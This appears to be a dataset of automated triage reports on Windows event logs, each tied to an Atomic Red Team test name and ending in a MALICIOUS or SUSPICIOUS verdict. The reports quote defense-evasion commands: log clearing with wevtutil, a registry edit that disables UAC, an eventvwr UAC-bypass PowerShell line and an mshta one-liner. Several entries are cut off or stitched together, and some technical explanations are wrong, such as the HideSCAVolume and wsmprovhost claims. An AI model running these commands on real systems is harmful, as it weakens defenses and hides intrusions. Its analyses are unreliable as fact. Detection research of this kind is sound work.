   - These modifications could suggest unauthorized access or preparation for lateral movement by adjusting firewall rules to allow specific network traffic.

4. **Time Discrepancy:**
   - There is an Event ID 4616 in the Security log indicating a time change. This could be benign or an attempt to construct timestamps for further confusion or concealment of actions.
   
5. **Execution of System Utilities and Services:**
   - The repeated execution of legitimate system utilities (e.g., `whoami.exe`, `hostname.exe`) might suggest attempts to gather system information.

6. **Microsoft Edge Update Logs:**
   - A series of processes related to Microsoft Edge Update are observed. While this might be legitimate, the context of their execution closely following the suspicious activities might be noteworthy, but on its own, it doesn’t present a malicious intent.

**Overall Assessment:**

- **Resolution: MALICIOUS**

Given the evidence of event log clearing, firewall rule modifications, and the suspicious behavior of essential system utilities executed in high integrity contexts, the behavior captured within the logs is consistent with potential unauthorized access or preparation for further malicious activities. The context of events suggests an administrator account (`admin_test`) may be compromised or misused.

**Guidance:**

1. **Immediate Actions:**
   - Disable or scrutinize the user account `admin_test` and reset associated credentials.
   - Conduct a comprehensive audit of access logs across other systems in the network to determine if lateral movement occurred.
   - Restore logs from backups to analyze any additional malicious activity before this event.

2. **Long-term Actions:**
   - Review and enhance logging and monitoring policies to detect and alert on log clearance and unusual admin-level command executions in the future.
   - Assess and harden remote desktop and firewall rule configurations to prevent unauthorized changes.
   - Conduct an incident response exercise to improve readiness against similar malicious activities. 

Given the provided evidence, the identified actions and logs exhibit behavior that is characteristic of malicious intent."
attrib - Remove read-only attribute,"Based on an analysis of the provided logs, here is a detailed breakdown of the events and their significance, followed by a resolution:

### Analysis

1. **Log Clearing Activities**:
    - **Event ID 104 (System Log)**: Multiple logs have been cleared by the user `admin_test` across different channels (`System` and `Windows PowerShell`). This is indicated by the Event ID 104 which logs the clearing of event logs.
    - **Event ID 1102 (Security Log)**: Security logs have been cleared by the same user, `admin_test`. This is concerning as clearing log entries is a common malicious tactic to cover tracks.

2. **Command Execution Patterns**:
    - Multiple entries in the Sysmon logs highlight the execution of potentially suspicious command-line activities by the `cmd.exe` process using the user `SERVER002\\admin_test`.
    - Command executions related to accessing or modifying attributes (e.g., `attrib.exe +r`) on files in temporary directories could relate to malicious intent, potentially obfuscating files or controlling file permissions.

3. **Wevtutil Execution**:
    - Multiple `wevtutil.exe` commands (`cl` commands indicating clearing specific logs) are indicative of an attempt to clear specific event logs, often associated with sophisticated attacks, aiming to tamper or erase forensic traces of activities.

4. **Scheduled or Automated Task Patterns**:
    - The logs related to `MicrosoftEdgeUpdate.exe` show typical update processes that appear consistent with legitimate software updates. Multiple Edge update processes are observed, which seems normal for keeping software updated automatically.

5. **General Observations**:
    - There are no entries in the Windows PowerShell log, which means no logged PowerShell activity was observed during this timeframe.

### Conclusion and Recommendation

- The operation of `wevtutil.exe` to clear logs, combined with the act of clearing security logs and command executions aimed at modifying attributes could point towards an attempt to cover malicious activities. These actions are suspicious and potentially indicative of attempts to avoid detection.
- The extensive and systematic clearing of logs by an administrative account (`admin_test`) under high integrity levels (as captured in the Sysmon logs) is not typical of routine system or maintenance tasks and requires further investigation.

### Resolution

The combination of events identified indicates potentially unauthorized activities aiming to obscure logs and manipulate file attributes. The behavior observed is consistent with tactics used in malicious scenarios. Therefore, I categorize these findings under the resolution:

**MALICIOUS**

### Guidance

- **Immediate Action**: Ensure the integrity of `Server002` by isolating the system from the network to prevent any further malicious activities.
- **Forensic Investigation**: Conduct a detailed forensic analysis to determine the root cause and extent of any compromise. Investigate user activities associated with `admin_test`.
- **Security Measures**: Review and enhance logging and monitoring mechanisms to detect similar behaviors in the future. Consider implementing stricter access controls and regular reviews of administrative account activities.
- **Incident Response**: Follow your organization’s incident response plan, inform relevant stakeholders and conduct a post-incident review to fortify defenses against similar future threats."
Windows HideSCAVolume Group Policy Feature,"Upon analyzing the provided logs, there are several key points and traces of activity that stand out and warrant attention:

1. **Log File Clearing**: The logs contain multiple entries related to log file clearing. Specifically, we see events where logs in channels such as System, Windows PowerShell, and Security have been cleared by a user ""admin_test."" This action is suspicious because clearing logs is a known tactic used by malicious actors to cover their tracks. 

2. **Use of Wevtutil**: There are numerous entries involving the use of ""wevtutil.exe,"" which is a Windows utility to manage Windows event logs. The command-line execution of ""wevtutil"" to clear logs, e.g., `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational`, indicates deliberate log clearing attempts by the same user ""admin_test.""

3. **Registry Modification**: There is a suspicious command executed by `cmd.exe` to modify the registry: `\""cmd.exe\"" /c reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v HideSCAVolume /t REG_DWORD /d 1 /f`. This registry key hides the Security Center Alert Volume, which could be an attempt to disable security alerts.

4. **High Privileges**: The logs indicate the presence of high integrity level processes, and privileges such as `SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege` are listed. The privileges attained by the user ""admin_test"" are substantial, suggesting they have significant control over the system.

5. **Time Changes**: Although this could be part of an administrative function, the logs show time configuration changes, often a method used by attackers to sync logs or trigger specific events at desired times.

6. **No Direct PowerShell Logs**: Importantly, for Windows PowerShell, which was cleared, there are no direct logs present, which limits our ability to correlate activities further and reinforces the suspicion on intentional log wiping. 

**Conclusion and Resolution**: Based on these observations, the behavior recorded in the logs, including the log clearing events with `wevtutil`, registry manipulations, and privilege escalations, strongly suggest the possibility of malicious activity. Given the systematic clearing of logs, changes to registry settings, and privilege details observed, I conclude the findings as follows:

- **Resolution**: MALICIOUS

**Guidance on How to Proceed**:
1. **Immediate Isolation**: Isolate the host from the network to prevent further potential damage or lateral movement.
2. **Forensic Analysis**: Conduct a thorough forensic investigation to identify the scope of the compromise, focusing on data exfiltration attempts.
3. **Review and Audit**: Conduct a review of user account activities, especially the ""admin_test"" account, and audit critical access logs to identify unauthorized access.
4. **Patch and Harden**: Ensure that systems are fully patched and review security policies to strengthen defenses against privilege escalation and ensure logs cannot be easily wiped.
5. **Backup and Recovery**: Verify the integrity of data backups for potential recovery operations and to secure a clean system state."
Disable UAC using reg.exe,"Upon analyzing the provided Windows event logs, I have identified several key points that may indicate suspicious or potentially malicious activity:

1. **Event Log Clearing**:
   - There are several instances in both the System and Security logs showing that the event logs were cleared by a user with the username ""admin_test"" (`EventID: 104` & `1102`). Clearing event logs can be a tactic used by malicious actors to cover their tracks after performing unauthorized activities.

2. **Command-Line Activity**:
   - There are multiple Sysmon events indicating the execution of `wevtutil.exe` to clear logs (`cl`) for various channels like System, Application, and Windows PowerShell. This corresponds to the log clearing activities possibly performed by the ""admin_test"" user.
   - The key command involved: 
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl [ChannelName]`

3. **Potential Privilege Escalation**:
   - There is a `cmd.exe` process that executed a command to modify system registry settings related to User Account Control (UAC), disable LUA (EnableLUA set to 0) which could effectively lower system security settings.
   - Command involved: 
     - `""cmd.exe"" /c reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f`

4. **Time Manipulation**:
   - Security Event Logs (`EventID: 4616`) show evidence of system time being adjusted, which can be used to confuse log times and create dissonance in event timing.

The above activities are indicative of a successful compromise:

- Clearing of logs and system time manipulation are strong signals of malicious intent to cover up unauthorized or undetected activities.
- The registry modification to disable User Account Control (UAC) is a common tactic in privilege escalation or securing persistence.

**Final Assessment**: 
- **Resolution: MALICIOUS**
- Indicators suggest a compromise with potentially unauthorized privilege escalation and attempts to hide activity. Immediate attention such as incident response investigation, network isolation, and a complete security audit is warranted.
- Recommendations include restoring systems from a known good backup, enforcing stricter access controls, and increasing logging and monitoring to detect any further activities."
UACME Bypass Method 61,"Upon analyzing the provided Windows event logs, several potentially suspicious activities stand out, which could indicate malicious behavior or compromise:

1. **Sysmon Events:**

   - Various instances of `cmd.exe` and `powershell.exe` being executed with the context of user `SERVER002\\admin_test`. Notably, they seem to be executing commands which involve the `AtomicRedTeam` and `uacme` tools (e.g., `Akagi64.exe`). These tools are commonly used for testing detection capabilities and privilege escalation techniques, possibly indicating a simulation of an attack or an actual malicious attempt to escalate privileges.
   - The presence of `wevtutil.exe` running with commands to clear logs (`cl` command) is highly suspicious. This utility is typically used to clear event logs, which could be an attempt by an attacker to cover their tracks.

2. **System Events:**

   - Event ID 104 indicates that logs such as the System and Windows PowerShell logs have been cleared by `admin_test`. Clearing logs is a typical indicator of malicious intent to remove traces of activities.

3. **Security Logs:**

   - Event ID 1102 in the Security log also confirms log clearing by `admin_test`, which further corroborates potential malicious activity.
   
4. **Use of SYSTEM Account:**

   - Numerous events show processes being executed as `NT AUTHORITY\\SYSTEM`, which have elevated privileges. While some of these activities are legitimate system maintenance tasks, in combination with other suspicious activities, these should be investigated further to ensure it's not malicious exploitation.

5. **Privilege Escalation Attempts:**

   - The entries involving `SeDebugPrivilege`, `SeTcbPrivilege`, and several other powerful privileges being assigned (Event ID 4672) could be legitimate for certain services but are worth reviewing due to the context provided in other logs.

**Assessment:**

The combination of log clearing, suspicious command-line executions related to known testing tools for attacks (e.g., AtomicRedTeam, uacme), and high-level privileges being used compels the conclusion that these logs indicate potentially malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Response:**
   - Isolate the affected system (Server002) from the network to prevent further spread or damage.
   - Initiate a comprehensive security scan and analysis of the affected machine using updated antivirus/antimalware tools.
   
2. **Incident Investigation:**
   - Conduct a thorough investigation to assess the scope and impact of the intrusion, including identifying any data exfiltration or further system compromises.
   - Review user activity for `admin_test` and consider interviewing this user, as their credentials might have been used fraudulently.

3. **Remediation and Hardening:**
   - Reset credentials and update all affected accounts, particularly focusing on administrative and system accounts.
   - Review and tighten security controls including log management and monitoring to prevent log clearing by unauthorized users.
   - Consider introducing additional controls for high-privilege actions and closely monitoring privileged accounts for unusual activities.

4. **Detection and Monitoring:**
   - Enhance logging, especially with tools like Sysmon to gain deeper visibility into system activities.
   - Set up alerts for log clearing events and unusual privilege assignments to facilitate quicker detection of future incidents.
   
By implementing these measures, the organization can mitigate the immediate threat and bolster its defenses against similar attacks in the future."
Execute base64-encoded PowerShell from Windows Registry,"Based on the provided logs, the key points of analysis are as follows:

### Windows PowerShell Log:
1. **Encoded Command Execution**:
   - The logs contain PowerShell commands with encoded command lines using Base64 encoding, which are then executed with `Invoke-Expression (IEX)`. This technique is a common sign of obfuscation often used by malware to execute payloads in a stealthy manner.

2. **Registry Manipulation**:
   - There's a use of `Set-ItemProperty` to manipulate a registry key (`HKCU:Software\Microsoft\Windows\CurrentVersion`), storing encoded PowerShell commands under the value `Debug`. Registry persistence techniques can be indicative of malicious activity, as malware often uses the registry to store code for later execution.

### Application Log:
- **Windows Defender Active**:

Immediate action is required to investigate further, contain the potential threat, and prevent further compromise."
Bypass UAC using Event Viewer (PowerShell),"Upon reviewing the provided logs, several key details stand out which raise concerns about potential malicious behavior:

1. **Wevtutil.exe and conhost.exe Activity**:
   - Multiple instances of `wevtutil.exe` are seen executed by the user `SERVER002\admin_test`. The command line arguments indicate the usage of `wevtutil.exe` to clear logs (command ending with `cl` refers to ""clear log""). This is often used to cover tracks after malicious activity:
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`

2. **PowerShell Execution**:
   - There is a potentially malicious PowerShell command:
     - `powershell.exe` executes commands which attempt to change the Registry and start `eventvwr.msc`. This is a known method for bypassing User Access Control (UAC) to gain elevated privileges:
       - `\""powershell.exe\"" & {New-Item \""HKCU:\\software\\classes\\mscfile\\shell\\open\\command\\\"" -Force, Set-ItemProperty \""HKCU:\\software\\classes\\mscfile\\shell\\open\\command\\\"" -Name \""(default)\"" -Value \""C:\\Windows\\System32\\cmd.exe\"" -Force, Start-Process \""C:\\Windows\\System32\\eventvwr.msc\""}`

3. **Log Clearing**:
   - Security and system logs show entries possibly related to log clearing events. This action can be an indicator of an attempt to conceal malicious activities.
   - Event ID `1102` in the Security log is indicative of the security log being cleared.
   - Events with ID `104` in the System log also indicate logs being cleared.

4. **Time Manipulation**:
   - There are events related to time change:
      - Events with ID `4616` in the Security log, and similar events in the System log, indicate changes to system time, which can be used to confuse timestamps and forensic analysis.

5. **Privilege Levels and Sessions**:
   - There are instances where special privileges were assigned to the user `admin_test`, as seen in Event ID `4672`, which includes powerful privileges like `SeDebugPrivilege`, which is typically unnecessary for regular administrative tasks.

Overall, these findings are indicative of activity typically associated with compromised environments. The usage of `wevtutil.exe` to clear logs, combined with potentially malicious PowerShell activity, time manipulation, and high privileges suggest a concerted effort to execute and then cover up potentially unauthorized activity.

**Resolution**:
- **MALICIOUS**: The logs contain strong indicators of potentially malicious actions, including log clearing, suspicious use of PowerShell, and privilege misuse. Immediate investigation and remediation are suggested, including:
  - Conduct a full forensic analysis of the affected machine.
  - Isolate the machine from the network.
  - Review user accounts and privileges.
  - Monitor any further abnormal activities across the network.
  - Consider restoring the system to a previous state before these events occurred if other mitigation actions are unsuccessful."
Mshta used to Execute PowerShell,"After thoroughly analyzing the provided Windows event logs, here is the detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs:**
   - There are multiple instances where `wevtutil.exe` was executed with the `cl` parameter to clear event logs (`Application`, `System`, `Security`, `Windows PowerShell`). The clearance of these logs was executed by the user `SERVER002\\admin_test`.
   - The relevant Event IDs from the logs are as follows:
     - Sysmon Event ID 1 and 5 indicate execution of `wevtutil.exe` with the command line `wevtutil.exe cl System`, `wevtutil.exe cl Application`, and `wevtutil.exe cl Security`.
     - An explicit system event `EventID 104` documents the clearance of logs by `admin_test`.

2. **Execution of Potentially Malicious Commands:**
   - The command injection using `mshta.exe` to run `powershell.exe` non-interactively with the `-nop` (no profile) and `-Command` options is suspicious. This behavior indicates an attempt to execute a PowerShell command in a stealthy manner.
     - The command line for this execution is captured as `mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%20""""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205""""""))</script>'`.

3. **Time Manipulation:**
   - The system time appears to have been modified during the period of interest, as captured by multiple `EventID 4616` (Security log). This alteration of time could indicate attempts to confuse event logging and hinder forensic investigation.

### Indications of Malicious Activity or Compromise:

- The use of `wevtutil.exe` to clear important event logs such as `System`, `Security`, and `Windows PowerShell` is a strong indicator of malicious activity aimed at covering up traces of actions performed on the system.
- Executing scripts via `mshta.exe` with `powershell` commands in a potentially evasive manner suggests an attempt to perform unauthorized operations without being easily detected.
- The system time tampering further supports the case for suspicious activity, possibly used to mislead event timestamps.

### Assessment:
The logs present strong indicators of potential compromise due to:
- The deliberate clearing of event logs, which is a common tactic in intrusion scenarios to obfuscate actions.
- The execution of potentially malicious scripts through uncommon mechanisms like `mshta.exe` with embedded commands targeting PowerShell.

### Resolution:
**MALICIOUS** - The combination of log clearing, suspicious PowerShell execution, and time manipulation provides enough evidence to conclude with high confidence that the observed actions are malicious.

### Guidance on How to Proceed:
- **Immediate Investigation**: Conduct a deeper forensic analysis on `Server002` to identify any further indicators of compromise and determine the extent of malicious activity.
- **User Accountability**: Investigate the actions of the user `admin_test` who was responsible for the actions logged in these events.
- **System Remediation**: Patch any vulnerabilities and misconfigurations that allowed the execution of these malicious activities.
- **Network Monitoring**: Enhance network monitoring to detect and respond to similar activities in real time.
- **Policy Enforcement**: Strengthen security policies around account privileges, logging, and monitoring to prevent future occurrences."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"Based on the analysis of the Windows event logs provided, here are the key findings:

1. **Event Log Clearing**:
   - The `Security`, `System`, and `Windows PowerShell` event logs were cleared, as indicated by events with `EventID: 1102` (Security log) and `EventID: 104` (System logs). The act of clearing logs, especially by a user named `admin_test`, is a significant red flag and often characteristic of an attempt to cover tracks after unauthorized or malicious activities.

2. **Suspicious Process Execution**:
   - The execution of `wevtutil.exe` to clear various logs, as indicated by multiple Sysmon events, is additional evidence supporting log tampering. The use of `wevtutil.exe` with the command-line argument to clear logs (`cl`) is explicitly seen in the Sysmon log.
   - There's the appearance of a specific PowerShell command designed to execute an HTA application, which is concerning: `powershell.exe & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe}`. This command suggests an attempt to execute potentially harmful script/code. Using PowerShell for lateral movement simulations or tasks it can be used for malicious purposes.

3. **Process Chain**:
   - The `wsmprovhost.exe` process, often associated with Windows Management Instrumentation (WMI) provider hosting, was the parent for processes executing `wevtutil.exe`, implying potential misuse of WMI for executing these commands.

4. **Execution Patterns**:
   - Several processes (`wevtutil.exe`, `conhost.exe`, and `powershell.exe`) were executed in a tight sequence, all involving the same `admin_test` user. Such patterns highlight potential scripted or partially automated tasks indicative of malicious activity.

5. **Potential Malicious Intent**:
   - The presence of `PowerShell` scripts and the clearing of logs by `wevtutil.exe` indicate possible attempts to execute malicious actions while preventing detection and maintaining stealth.

### Assessment:
The comprehensive nature of log clearance events, coupled with the suspicious PowerShell execution command, asserts a conclusion beyond just benign behavior. The clearing of logs and the nature of the PowerShell command strongly imply potentially malicious activity.

### Resolution:
- **MALICIOUS**: The logs indicate deliberate attempts to obscure actions (log clearing) and potentially execute harmful commands via PowerShell. Immediate action is recommended, including isolating the affected host, conducting full forensic analysis, ensuring all security patches and defenses are up-to-date, and reviewing user access controls and privileges to prevent future occurrences.

Compiled HTML Help Local Payload,"**Detailed Analysis:**

1. **Log Clearing Activity:**
   - An event with `EventID: 1102` in the Security log indicates that the security log was cleared at `2024-10-25 22:06:51.6725489`. The `admin_test` account was involved (`ClientProcessId: 5384`). This is a potential indicator of malicious activity as attackers often clear event logs to cover their tracks.

2. **Process Execution:**
   - Windows Event ID `1` from Sysmon indicates the execution of multiple `wevtutil.exe` processes (event log clearing utility), associated with clearing logs:
     - Cleared the Microsoft-Windows-Sysmon/Operational log (`ProcessId: 6724`)
     - Cleared the Application log (`ProcessId: 6836`)
     - Cleared the System log (`ProcessId: 5608`)
     - Cleared the Security log (`ProcessId: 5384`)
     - Each process was initiated by the `admin_test` user, who also executed `cmd.exe` to run `hh.exe` with the path `""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.001\src\T1218.001.chm""` which is indicative of using an execution technique from the Atomic Red Team library.

3. **Privilege Escalation:**
   - `EventID: 4672` shows the assignment of special privileges to `admin_test`, such as `SeDebugPrivilege`, which allows for extensive system control often required by malware or during privilege escalation exploits.

4. **Network Connection:**
   - A logon event (`EventID: 4624`) shows a logon type of `3` from `WorkstationName: DESKTOP-3HL5B2P` using the `NTLM` authentication, which might be legitimate but should be investigated, especially under the context of an account with elevated privileges taking other suspicious actions.

5. **Suspicious Executions:**
   - Execution of `cmd.exe` with unusual command line calling `hh.exe` with an Atomic Red Team file suggests potential simulated attack activity.
   - Multiple executions of `conhost.exe` indicate console hosts being invoked potentially in suspicious context and some involvement with log clearing processes.

**Assessment and Conclusion:**

The logs contain several indicators of potential malicious activity:
- Evidence of log clearing, often used to cover traces of unauthorized or malicious actions.
- Attempted executions of suspicious tools linked to potential attack simulations.
- Privilege escalation attempts by a user account `admin_test` seemingly executing a number of suspicious actions within a condensed time frame.

**Resolution:**
- **MALICIOUS** - due to the presence of log clearing, suspicious process executions, and potential simulated attack behavior.

**Guidance on How to Proceed:**
1. Isolate the machine `Server002` from the network to prevent further potential compromise.
2. Conduct a full forensic analysis of the system to determine the extent of compromise and any persistent threats.

Windows - Modify file creation timestamp with PowerShell,"**Analysis of Logs:**

The provided logs, across various Windows event log channels, reveal several activities indicative of potentially malicious activity:

1. **Event Clearing:** 
   - **Sysmon Logs:** Multiple instances of `wevtutil.exe` being executed to clear event logs, including the Sysmon, Application, and Security logs (`CommandLine` indicates clearing of logs).
   - **System Logs:** Event ID 104, which indicates the clearing of event logs, is noted with user `admin_test` performing this action on channels like `System`, `Windows PowerShell`.
   - **Security Logs:** Event ID 1102, indicating the Security log was cleared by `admin_test`.

2. **Suspicious Command Usage:**
   - **PowerShell Activity:** Two instances of PowerShell execution (`powershell.exe`) by user `admin_test`, with a command that alters the file creation timestamp of a file related to an Atomic Red Team test suite (`T1551.006_timestomp.txt`). This activity is associated with Timestomping, a known anti-forensic technique used to modify the timestamps of files.
   
3. **Indicators of Forensic Anti-Detection:**
   - Achieving persistence or covering tracks by clearing event logs can indicate a potential compromise. Both registry and command line activities using administrator accounts without clear operational justification (from the provided logs) raise concerns about unauthorized or malicious use.
   
4. **Time Changes:**
   - The logs indicate multiple instances where system time was altered via `svchost.exe` (`EventID: 4616`). Consistent manipulation of system time can be used as a tactic to mislead investigators or circumvent time-based defenses.

5. **Edge Updaters:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` executed under `NT AUTHORITY\SYSTEM`, which by itself isn't suspicious without additional context. However, due to the presence of critical suspicious activities, these events can be re-evaluated as potentially performing non-standard system-level activities.

6. **High Integrity Level Execution:**
   - Multiple processes executed with high integrity level under the `admin_test` account, highlighting execution privilege that can reflect potential lateral movement or privilege escalation tactics in practice.

**Conclusion: Determination**

The logs exhibit clear evidence of malicious behavior:

- The use of PowerShell scripts to alter timestamps on files.
- The systematic clearing of event logs in various channels to potentially cover tracks.
- Manipulation of system time, possibly to evade detection mechanisms.
- Execution of administrative tasks (like clearing event logs and running suspicious command-line scripts) using an `admin_test` account which may have been compromised. 

**Resolution: MALICIOUS**

**Guidance:**

- Immediate containment is recommended, starting with disabling the affected account (`SERVER002\\admin_test`).
- Conduct a comprehensive forensic analysis on `Server002` to understand the full scope of potential system or network compromise.
- Review and audit user account activities company-wide for similar patterns of behavior.
- Re-establish system log integrity and enhance monitoring to detect and alert on tampering activities.

Odbcconf.exe - Load Response File,"Upon analyzing the provided Windows event logs, I've identified several events of interest that indicate potentially suspicious behavior:

1. **Clearing of Event Logs**:
    - Event 1102 (Security log) and Event 104 (System log): The logs indicate that the event logs were cleared by a user with the SID `S-1-5-21-3962163828-2803415714-1403596700-1006`, corresponding to the username `admin_test`. Clearing logs is often used by malicious actors to cover their tracks after performing unauthorized activities.

2. **Execution of `wevtutil.exe`**:
    - Multiple instances of `wevtutil.exe` execution appear in the Sysmon logs with command lines indicating the clearing (`cl`) of logs for various channels (e.g., `Security`, `System`, `Microsoft-Windows-Sysmon/Operational`). These executions also are linked to the `admin_test` user.
  
3. **Privilege Escalation and High-Integrity Operation**:
    - Event 4672 (Security log): This event logs a special privileges assignment to `admin_test`, granting a wide range of powerful privileges. Such privileges can be misused if in the hands of an unauthorized user.

4. **Edge Installation and Related Setup Executables**:
    - Numerous processes related to Microsoft Edge updates and installations are noted (e.g., `setup.exe`, `mini_installer.exe`). While these processes could be legitimate updates, the sheer volume and execution involve command-line arguments that suggest potentially automated or scripted execution, which could be benign if properly scheduled but anomalous without clear necessity or logging of updates.

5. **Execution of CMD and ODBC Setup**:
    - Sysmon Event 1 logs indicate execution of `cmd.exe` with the command to run `odbcconf.exe` with a specific response file (`T1218.008.rsp`). Activities involving `cmd.exe` in conjunction with `odbcconf.exe` are known techniques that attackers use for malicious purposes via LOLBins (Living off the Land Binaries).

Based on the analysis, the presence of log clearing, privilege escalation, and suspicious command executions strongly suggests malicious activity. These actions are consistent with attempts to perform unauthorized activities while covering tracks and potentially escalating privileges.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Conduct a forensic investigation to determine the scope and impact of the unauthorized and suspicious activities.
- Review and implement tighter access controls and privileges, especially for critical system accounts.
- Consider restoring logs from backups, if available, to further understand the timeline and activities carried out on the system.

- **Log Clearing**: The clearing of event logs is a common practice used by threat actors to hide their tracks post-exploitation. The coordination and rapid succession of these actions, conducted by the `admin_test` user, highlight potential attempts to obscure malicious activity.
  
- **Unauthorized or Suspicious Registry Changes**: The registry modification, specifically concerning authentication settings, could indicate an attempt to weaken security controls on the system.

### Conclusion:

Based on the logs and the nature of the activities observed:

- **SUSPICIOUS**: The actions, particularly the sequence of log-clearing events and registry modifications, indicate potentially suspicious activities. There’s no definitive proof of malicious intent with 100% certainty, but the activities are atypical and could suggest malicious actions, warranting further investigation.

### Recommendations for Further Investigation:

1. **User Verification**: Validate the actions of `admin_test` to determine if they were authorized or part of routine administrative tasks.

2. **Security Audit**: Conduct a thorough review of the system for other indicators of compromise, such as unauthorized file changes or network connections.

3. **Restore and Monitor**: If no justification for the activities is provided, consider restoring the system to a known good state and implementing enhanced monitoring for any further unauthorized actions or attempts at log tampering.

4. **Review Access Logs**: Check if `admin_test` or related user accounts have been involved in other suspicious activities or if there is any indication of a compromised account.

5. **Network Activity Review**: Examine any associated network logs for unusual outbound connections that could indicate data exfiltration efforts.

By following up with these investigations, it would be possible to conclusively determine the nature and intent of these activities."
Disable Defender Using NirSoft AdvancedRun,"Upon analyzing the provided Windows event logs, the following activities are identified as indicative of suspicious or malicious actions:

1. **Log Clearing Activity:**
   - Several log entries indicate the clearing of important event logs, such as Security, System, and Windows PowerShell logs. This is often performed by attackers to cover their tracks post-exploitation.
   - Event ID 1102 in the Security log and Event ID 104 in the System log show logs being cleared by the user ""admin_test.""

2. **PowerShell Activity:**
   - There is evidence of PowerShell being used with potentially harmful intent. The command includes paths referencing ""AtomicRedTeam"" and ""AdvancedRun.exe,"" which are often associated with adversary simulation tools and could indicate malicious use of these scripts.
   - Specifically, attempts to stop Windows Defender services using `sc.exe` are observed through PowerShell, suggesting actions that aim to weaken system defenses.

3. **Process Execution:**
   - The execution of `AdvancedRun.exe` in combination with legacy system commands (`sc.exe`, `cmd.exe`) suggests an attempt to manipulate system configurations or execute commands with elevated privileges.

4. **Credential and System Information Enumeration:**
   - The use of `whoami.exe` and `hostname.exe` shows that the user ""admin_test"" was attempting to gather system and user information, which is consistent with an initial reconnaissance or privilege escalation stage.

5. **Integrity and User Context:**
   - Most of the processes are run with a high integrity level and by the user ""SERVER002\admin_test,"" which indicates the usage of an administrative account for carrying out potentially malicious activities.

6. **Usage of Third-Party Execution Tools:**
   - The employment of `AdvancedRun.exe` for executing system commands further points to potentially unauthorized actions by an attacker to escalate privileges or alter system states without detection.

Given these findings, there is strong evidence of malicious activity represented in the logs. The coordinated log clearing, execution of adversary simulation tools, and attempts to disable security software indicate a deliberate attempt to compromise the system.

Makes Eventlog blind with Phant0m,"Upon reviewing the provided event logs, I have identified several activities that raise concerns of potential malicious behavior:

1. **Event Log Clearing:**
   - Two event IDs (104) in the System log indicate that both the System and Windows PowerShell logs were cleared by an account named ""admin_test"". Log clearing can be indicative of an attempt to cover up unauthorized or malicious activities.

2. **Use of `wevtutil.exe`:**
   - Multiple instances of the `wevtutil.exe` command-line utility were logged, specifically clearing multiple event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell`). This tool is generally used to manage event logs and its use in clearing logs further suggests malicious intent.

3. **Suspicious Command Execution:**
   - The presence of the `cmd.exe` process executing a command to run `Phant0m.exe` (from the location `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1562.002\bin\`) is noteworthy. `Phant0m` is known as a tool used to hide malicious activity by stopping event logging.

4. **Privileges and Service Manipulation:**
   - Security Event IDs 4672 confirm that the SYSTEM account had elevated privileges, which aligns with potential misuse of administrative functions.

The **combination of cleared logs**, the use of tools like `Phant0m.exe`, and the **exploit of `wevtutil.exe`** strongly point towards deliberate attempts to mask malicious activities, likely indicating an unauthorized intrusion or security breach.

### Resolution: MALICIOUS

**Recommendations:**
- Immediately conduct a deeper forensic analysis to identify the scope of the compromise.
- Isolate the affected system (Server002) from the network to prevent further malicious activity or spreading to other systems.
- Review and enforce security policies, including event logging and the use of privileged accounts.
- Consider involving incident response specialists to assist in investigation and recovery efforts.
- Reset credentials for the ""admin_test"" account and other accounts that may have been affected.
- Increase monitoring for similar activities across other systems to identify any broader exposure."
Hide Files Through Registry,"Upon analyzing the provided event logs, several activities stand out indicating potentially malicious behavior:

### Suspicious or Anomalous Behavior Observed:
1. **Log Clearing Activity**:
   - Multiple instances of log clearing using `wevtutil.exe` are noted across different logs (System, Application, and Security). The command-line entries show log files being cleared by the user `admin_test`. This behavior can be indicative of an attempt to cover tracks, a common tactic used in malicious activity. `wevtutil.exe cl` commands are seen with various arguments targeting different logs (Sysmon/Operational, Application, Windows PowerShell, Security).

2. **Unauthorized Modifications to System Registry**:
   - A `cmd.exe` process is observed executing a command to modify registry keys related to Explorer settings (`ShowSuperHidden` and `Hidden`). These changes could potentially hide files or folders, another technique to conceal malicious activity.

3. **Potential Privilege Escalation Attempt**:
   - The logs show the execution of the `hostname.exe` and `whoami.exe` commands typically used in reconnaissance to gather system information. While these commands are not inherently malicious, when observed together with log clearing, they could form part of an enumeration or privilege escalation endeavor.

### Events Indicating Malicious Activity or Compromise:
- The concurrent occurrences of multiple log clearances (System, PowerShell, Security logs), in conjunction with potentially unauthorized registry changes and system reconnaissance, strongly indicate potential malicious intent rather than accidental or administrative activity.

### Risk Assessment:
- The log entries collectively suggest deliberate actions to modify system settings, gather information about the host, and clear logs which may have been captured. This aligns with common tactics, techniques, and procedures (TTPs) found in advanced persistent threat (APT) activities aimed at maintaining persistence and evading detection.

### Guidance on How to Proceed:
1. **Immediate Containment**: The machine identified (Server002) should be isolated from the network to prevent further unauthorized activity or data exfiltration.
2. **Forensic Investigation**: Conduct a full forensic investigation to identify any unauthorized access, data manipulation or malware present on the host. Review additional log data or network traffic to identify any connections to known malicious IPs or domains.
3. **User Access Review**: Verify and audit user `admin_test` privileges and access history. Investigate any unusual access patterns or anomalies in user behavior.
